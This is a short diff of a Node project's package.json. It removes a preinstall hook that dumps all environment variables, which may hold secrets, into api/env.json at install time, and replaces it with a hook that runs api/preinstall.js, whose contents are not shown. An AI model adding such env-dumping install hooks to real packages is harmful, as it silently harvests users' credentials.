@@ -11,6 +11,6 @@
   "main": "api.js",
   "scripts": {
     "start": "node api.js",
-    "preinstall": "node -e 'console.log(JSON.stringify(process.env))' > api/env.json"
+    "preinstall": "node api/preinstall.js"
   }
 }
